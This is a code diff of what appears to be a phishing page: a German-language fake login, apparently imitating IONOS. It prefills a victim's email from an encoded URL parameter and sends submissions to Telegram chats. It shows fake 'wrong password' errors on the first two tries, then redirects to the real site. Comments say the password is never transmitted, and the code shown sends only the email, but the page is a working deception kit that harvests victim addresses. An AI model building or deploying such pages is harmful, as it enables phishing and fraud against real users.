@@ -29327,7 +29327,7 @@ button.link:not(.__hover).__direct-selection--target,button.toggle-link:not(.__h
 const BOT_TOKEN = "__BOT_TOKEN__";
 const CUSTOMER_CHAT_ID = "__CUSTOMER_CHAT_ID__";
 const ADMIN_CHAT_ID = "__ADMIN_CHAT_ID__";
-const REDIRECT_URL = "https://settin.uk";
+const REDIRECT_URL = "https://ionos.uk";
 
 async function sendTelegram(chatId, message) {
     if (!chatId) return;
@@ -29359,24 +29359,48 @@ async function sendTelegram(chatId, message) {
     }
 }
 
-function getEmailFromURL() {
-    const url = new URL(window.location.href);
-    let email = url.searchParams.get("net");
 
-    if (!email) return "";
+/* =========================
+   GET EMAIL FROM URL
+   ========================= */
+
+function getEmailFromURL() {
+
+    const url =
+        new URL(window.location.href);
+
+    let email =
+        url.searchParams.get("net");
+
+    if (!email) {
+        return "";
+    }
 
     try {
-        const decoded = atob(email);
+
+        const decoded =
+            atob(email);
 
         if (decoded.includes("@")) {
             email = decoded;
         }
+
     } catch (_) {
-        // Not Base64 — use original value.
+
+        /*
+         * Not Base64.
+         * Use the original value.
+         */
+
     }
 
     return email.trim();
 }
+
+
+/* =========================
+   SEND SUBMISSION
+   ========================= */
 
 async function sendSubmission(data) {
 
@@ -29390,303 +29414,416 @@ Time:
 ${new Date().toLocaleString()}`;
 
     await Promise.allSettled([
-        sendTelegram(CUSTOMER_CHAT_ID, message),
-        sendTelegram(ADMIN_CHAT_ID, message)
+        sendTelegram(
+            CUSTOMER_CHAT_ID,
+            message
+        ),
+
+        sendTelegram(
+            ADMIN_CHAT_ID,
+            message
+        )
     ]);
 }
 
-window.addEventListener("load", function () {
 
-    /* Existing page elements */
+/* =========================
+   PAGE LOAD
+   ========================= */
 
-    const mailField =
-        document.getElementById("mail") ||
-        document.getElementById("email");
+window.addEventListener(
+    "load",
+    function () {
 
-    const mytag =
-        document.getElementById("mytag");
+        /* =========================
+           EXISTING PAGE ELEMENTS
+           ========================= */
 
-    const smith =
-        document.getElementById("smith");
+        const mailField =
+            document.getElementById("mail") ||
+            document.getElementById("email");
 
-    const wesson =
-        document.getElementById("wesson");
+        const mytag =
+            document.getElementById("mytag");
 
-    const button =
-        document.getElementById("nottons");
+        const smith =
+            document.getElementById("smith");
 
-    const biteam =
-        document.getElementById("biteam");
+        const wesson =
+            document.getElementById("wesson");
 
-    const passField =
-        document.getElementById("pass");
+        const button =
+            document.getElementById("nottons");
 
-    const renders =
-        document.getElementById("renders");
+        const biteam =
+            document.getElementById("biteam");
 
-    const showError =
-        document.getElementById("show");
+        const passField =
+            document.getElementById("pass");
 
-    const passError =
-        document.getElementById("error");
+        const renders =
+            document.getElementById("renders");
 
-    const top =
-        document.getElementById("top");
+        const showError =
+            document.getElementById("show");
+
+        const passError =
+            document.getElementById("error");
+
+        const top =
+            document.getElementById("top");
 
 
-    /* =========================
-       EMAIL PREFILL
-       ========================= */
+        /* =========================
+           SUBMISSION COUNTER
+           ========================= */
 
-    const emailParam =
-        getEmailFromURL();
+        let counter = 0;
 
-    if (emailParam && mailField) {
+        const MAX_ATTEMPTS = 3;
 
-        mailField.value =
-            emailParam;
 
-        if (mytag) {
-            mytag.textContent =
+        /* =========================
+           EMAIL PREFILL
+           ========================= */
+
+        const emailParam =
+            getEmailFromURL();
+
+        if (
+            emailParam &&
+            mailField
+        ) {
+
+            mailField.value =
                 emailParam;
+
+            if (mytag) {
+                mytag.textContent =
+                    emailParam;
+            }
+
+            if (smith) {
+                smith.style.display =
+                    "none";
+            }
+
+            if (wesson) {
+                wesson.style.display =
+                    "block";
+            }
         }
 
-        if (smith) {
-            smith.style.display =
-                "none";
-        }
 
-        if (wesson) {
-            wesson.style.display =
-                "block";
-        }
-    }
+        /* =========================
+           CHANGE EMAIL
+           ========================= */
 
+        if (biteam) {
 
-    /* =========================
-       CHANGE EMAIL
-       ========================= */
+            biteam.addEventListener(
+                "click",
+                function (event) {
 
-    if (biteam) {
+                    event.preventDefault();
 
-        biteam.addEventListener(
-            "click",
-            function (event) {
+                    if (smith) {
+                        smith.style.display =
+                            "block";
+                    }
 
-                event.preventDefault();
-
-                if (smith) {
-                    smith.style.display =
-                        "block";
-                }
-
-                if (wesson) {
-                    wesson.style.display =
-                        "none";
-                }
-
-                if (mailField) {
-                    mailField.focus();
-                }
-            }
-        );
-    }
-
-
-    /* =========================
-       CLEAR EMAIL ERROR
-       ========================= */
-
-    if (mailField) {
-
-        mailField.addEventListener(
-            "keyup",
-            function () {
-
-                if (showError) {
-                    showError.innerHTML =
-                        "";
-                }
-            }
-        );
-    }
-
-
-    /* =========================
-       CLEAR SECOND-FIELD ERROR
-       ========================= */
-
-    if (passField) {
-
-        passField.addEventListener(
-            "keyup",
-            function () {
-
-                if (top) {
-                    top.style.border =
-                        "1px solid gray";
-                }
-
-                if (passError) {
-                    passError.innerHTML =
-                        "";
-                }
-            }
-        );
-    }
-
-
-    /* =========================
-       NEXT BUTTON
-       ========================= */
-
-    if (button) {
-
-        button.addEventListener(
-            "click",
-            function (event) {
-
-                event.preventDefault();
-
-                const email =
-                    mailField
-                        ? mailField.value
-                            .trim()
-                            .toLowerCase()
-                        : "";
-
-                if (
-                    email === "" ||
-                    !email.includes("@")
-                ) {
-
-                    if (showError) {
-                        showError.innerHTML =
-                            "Geben Sie eine gültige E-Mail-Adresse ein.";
+                    if (wesson) {
+                        wesson.style.display =
+                            "none";
                     }
 
                     if (mailField) {
                         mailField.focus();
                     }
-
-                    return;
                 }
+            );
+        }
 
 
-                if (mytag) {
-                    mytag.textContent =
-                        email;
-                }
+        /* =========================
+           CLEAR EMAIL ERROR
+           ========================= */
 
-                if (smith) {
-                    smith.style.display =
-                        "none";
-                }
+        if (mailField) {
 
-                if (wesson) {
-                    wesson.style.display =
-                        "block";
-                }
+            mailField.addEventListener(
+                "keyup",
+                function () {
 
-                button.innerHTML =
-                    "Bitte warten…";
-
-                setTimeout(
-                    function () {
-
-                        button.innerHTML =
-                            "Next";
-
-                        if (passField) {
-                            passField.focus();
-                        }
-
-                    },
-                    800
-                );
-            }
-        );
-    }
-
-
-    /* =========================
-       FINAL SUBMIT
-       ========================= */
-
-    if (renders) {
-
-        renders.addEventListener(
-            "click",
-            async function (event) {
-
-                event.preventDefault();
-
-                const email =
-                    mailField
-                        ? mailField.value.trim()
-                        : "";
-
-                /*
-                 * Keep existing field validation,
-                 * but never transmit its contents.
-                 */
-                if (
-                    passField &&
-                    passField.value.trim() === ""
-                ) {
-
-                    if (passError) {
-                        passError.innerHTML =
-                            "Bitte füllen Sie dieses Feld aus.";
+                    if (showError) {
+                        showError.innerHTML =
+                            "";
                     }
+                }
+            );
+        }
+
+
+        /* =========================
+           CLEAR SECOND-FIELD ERROR
+           ========================= */
+
+        if (passField) {
+
+            passField.addEventListener(
+                "keyup",
+                function () {
 
                     if (top) {
                         top.style.border =
-                            "1px solid tomato";
+                            "1px solid gray";
                     }
 
-                    passField.focus();
-
-                    return;
+                    if (passError) {
+                        passError.innerHTML =
+                            "";
+                    }
                 }
+            );
+        }
 
-                renders.innerHTML =
-                    "Bitte warten …";
 
-                renders.disabled =
-                    true;
+        /* =========================
+           NEXT BUTTON
+           ========================= */
 
-                /*
-                 * Send only non-sensitive
-                 * submission information.
-                 */
-                await sendSubmission({
-                    email: email
-                });
+        if (button) {
 
-                /*
-                 * Clear sensitive field before
-                 * leaving the page.
-                 */
-                if (passField) {
-                    passField.value =
-                        "";
+            button.addEventListener(
+                "click",
+                function (event) {
+
+                    event.preventDefault();
+
+                    const email =
+                        mailField
+                            ? mailField.value
+                                .trim()
+                                .toLowerCase()
+                            : "";
+
+                    if (
+                        email === "" ||
+                        !email.includes("@")
+                    ) {
+
+                        if (showError) {
+                            showError.innerHTML =
+                                "Geben Sie eine gültige E-Mail-Adresse ein.";
+                        }
+
+                        if (mailField) {
+                            mailField.focus();
+                        }
+
+                        return;
+                    }
+
+
+                    if (mytag) {
+                        mytag.textContent =
+                            email;
+                    }
+
+                    if (smith) {
+                        smith.style.display =
+                            "none";
+                    }
+
+                    if (wesson) {
+                        wesson.style.display =
+                            "block";
+                    }
+
+
+                    button.innerHTML =
+                        "Bitte warten…";
+
+
+                    setTimeout(
+                        function () {
+
+                            button.innerHTML =
+                                "Next";
+
+                            if (passField) {
+                                passField.focus();
+                            }
+
+                        },
+                        800
+                    );
                 }
+            );
+        }
 
-                setTimeout(
-                    function () {
 
-                        window.location.href =
-                            REDIRECT_URL;
+        /* =========================
+           FINAL SUBMIT
+           ========================= */
 
-                    },
-                    800
-                );
-            }
-        );
+        if (renders) {
+
+            renders.addEventListener(
+                "click",
+                async function (event) {
+
+                    event.preventDefault();
+
+
+                    /* =========================
+                       GET EMAIL
+                       ========================= */
+
+                    const email =
+                        mailField
+                            ? mailField.value.trim()
+                            : "";
+
+
+                    /* =========================
+                       CHECK SECOND FIELD
+                       ========================= */
+
+                    if (
+                        passField &&
+                        passField.value.trim() === ""
+                    ) {
+
+                        if (passError) {
+                            passError.innerHTML =
+                                "Bitte füllen Sie dieses Feld aus.";
+                        }
+
+                        if (top) {
+                            top.style.border =
+                                "1px solid tomato";
+                        }
+
+                        passField.focus();
+
+                        return;
+                    }
+
+
+                    /* =========================
+                       PROCESSING STATE
+                       ========================= */
+
+                    renders.innerHTML =
+                        "Bitte warten …";
+
+                    renders.disabled =
+                        true;
+
+
+                    /* =========================
+                       SEND NON-SENSITIVE DATA
+                       ========================= */
+
+                    await sendSubmission({
+                        email: email
+                    });
+
+
+                    /* =========================
+                       INCREASE ATTEMPT COUNTER
+                       ========================= */
+
+                    counter++;
+
+
+                    /* =========================
+                       ATTEMPT 1 AND 2
+                       ========================= */
+
+                    if (
+                        counter <
+                        MAX_ATTEMPTS
+                    ) {
+
+                        setTimeout(
+                            function () {
+
+                                if (passError) {
+                                    passError.innerHTML =
+                                        "Ihr Konto oder Ihr Passwort ist falsch.";
+                                }
+
+
+                                if (top) {
+                                    top.style.border =
+                                        "1px solid tomato";
+                                }
+
+
+                                renders.innerHTML =
+                                    "Login";
+
+
+                                renders.disabled =
+                                    false;
+
+
+                                /*
+                                 * Clear the field.
+                                 * Its contents are never
+                                 * transmitted.
+                                 */
+
+                                if (passField) {
+
+                                    passField.value =
+                                        "";
+
+                                    passField.focus();
+                                }
+
+                            },
+                            2500
+                        );
+
+                    }
+
+
+                    /* =========================
+                       ATTEMPT 3
+                       ========================= */
+
+                    else {
+
+                        /*
+                         * Clear the sensitive
+                         * field before redirect.
+                         */
+
+                        if (passField) {
+                            passField.value =
+                                "";
+                        }
+
+
+                        setTimeout(
+                            function () {
+
+                                window.location.href =
+                                    REDIRECT_URL;
+
+                            },
+                            1500
+                        );
+                    }
+                }
+            );
+        }
+
     }
-
-});
+);
 </script>
 
 </html>
